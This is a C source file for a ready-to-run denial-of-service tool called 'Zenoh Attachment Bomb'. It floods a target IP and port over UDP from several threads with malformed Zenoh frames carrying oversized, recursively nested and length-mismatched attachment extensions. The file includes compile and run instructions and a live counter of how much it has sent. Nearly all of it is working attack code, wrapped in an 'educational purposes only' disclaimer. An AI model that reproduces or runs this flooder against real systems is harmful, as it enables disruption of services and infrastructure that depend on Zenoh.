/*
 * Attack 19: Attachment Bomb
 * Sends messages with huge/malformed attachments
 * 
 * Compile: gcc -o attack19_attachment attack_19_attachment_bomb.c -pthread
 * Run: ./attack19_attachment <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_MSG_FRAME 0x00
#define Z_FLAG_RELIABLE 0x20
#define Z_FLAG_EXTENSIONS 0x80
#define Z_EXT_ATTACHMENT 0x05

static volatile int g_running = 1;
static atomic_ullong g_bombs_sent = 0;
static atomic_ullong g_bytes_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping attachment bomb...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

// Attack variant 1: Huge nested attachments
size_t craft_huge_attachment(unsigned char *buffer, unsigned long long seq) {
    size_t offset = 0;
    
    buffer[offset++] = Z_MSG_FRAME | Z_FLAG_RELIABLE | Z_FLAG_EXTENSIONS;
    offset += encode_zint(buffer + offset, seq);
    
    // Attachment extension
    buffer[offset++] = Z_EXT_ATTACHMENT;
    
    // Huge attachment size (claim more than we send)
    size_t huge_size = 65000;
    offset += encode_zint(buffer + offset, huge_size);
    
    // Fill with pattern data
    size_t actual_size = 32768; // 32KB
    for (size_t i = 0; i < actual_size && offset < 65535; i++) {
        buffer[offset++] = (unsigned char)(i % 256);
    }
    
    return offset;
}

// Attack variant 2: Recursive attachments (attachment containing attachments)
size_t craft_recursive_attachment(unsigned char *buffer, unsigned long long seq) {
    size_t offset = 0;
    
    buffer[offset++] = Z_MSG_FRAME | Z_FLAG_RELIABLE | Z_FLAG_EXTENSIONS;
    offset += encode_zint(buffer + offset, seq);
    
    // Layer 1 attachment
    buffer[offset++] = Z_EXT_ATTACHMENT;
    buffer[offset++] = 100;
    
    // Inside: another attachment header
    for (int i = 0; i < 5; i++) {
        buffer[offset++] = Z_EXT_ATTACHMENT;
        buffer[offset++] = 50;
        memset(buffer + offset, 0xAA, 50);
        offset += 50;
    }
    
    return offset;
}

// Attack variant 3: Malformed attachment (wrong length)
size_t craft_malformed_attachment(unsigned char *buffer, unsigned long long seq) {
    size_t offset = 0;
    
    buffer[offset++] = Z_MSG_FRAME | Z_FLAG_RELIABLE | Z_FLAG_EXTENSIONS;
    offset += encode_zint(buffer + offset, seq);
    
    // Attachment with wrong length
    buffer[offset++] = Z_EXT_ATTACHMENT;
    offset += encode_zint(buffer + offset, 10000); // Claim 10000 bytes
    
    // But only send 100 bytes
    memset(buffer + offset, 0xBB, 100);
    offset += 100;
    
    return offset;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char *buffer = malloc(65536);
    
    if (!buffer) {
        fprintf(stderr, "[-] Thread %d: malloc failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(buffer);
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started (attachment bombing)\n", args->thread_id);
    
    unsigned long long seq = args->thread_id * 1000000ULL;
    unsigned long local_count = 0;
    
    while (g_running) {
        size_t msg_len;
        int variant = rand() % 3;
        
        switch (variant) {
            case 0:
                msg_len = craft_huge_attachment(buffer, seq);
                break;
            case 1:
                msg_len = craft_recursive_attachment(buffer, seq);
                break;
            case 2:
                msg_len = craft_malformed_attachment(buffer, seq);
                break;
        }
        
        seq++;
        
        ssize_t sent = sendto(sock, buffer, msg_len, 0,
                             (struct sockaddr*)&target_addr,
                             sizeof(target_addr));
        
        if (sent > 0) {
            atomic_fetch_add(&g_bombs_sent, 1);
            atomic_fetch_add(&g_bytes_sent, sent);
            local_count++;
        }
        
        if (local_count % 100 == 0) {
            printf("[Thread %d] Sent %lu attachment bombs\n",
                   args->thread_id, local_count);
        }
        
        usleep(10000); // 10ms delay
    }
    
    free(buffer);
    close(sock);
    printf("[*] Thread %d stopped\n", args->thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Attachment Bomb Attack             ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚══════════════════════��═════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Bomb variants:\n");
    printf("    1. Huge attachments (32KB+)\n");
    printf("    2. Recursive/nested attachments\n");
    printf("    3. Malformed length attachments\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long bombs = atomic_load(&g_bombs_sent);
        unsigned long long bytes = atomic_load(&g_bytes_sent);
        time_t elapsed = time(NULL) - start;
        
        printf("[*] Bombs: %llu | Data: %.2f MB | Rate: %.2f MB/s\n",
               bombs, bytes / 1048576.0,
               elapsed > 0 ? (bytes / 1048576.0) / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long long total_bombs = atomic_load(&g_bombs_sent);
    unsigned long long total_bytes = atomic_load(&g_bytes_sent);
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Bombs: %-29llu ║\n", total_bombs);
    printf("║ Total Data:  %-25.2f MB ║\n", total_bytes / 1048576.0);
    printf("║ Duration:    %-29ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}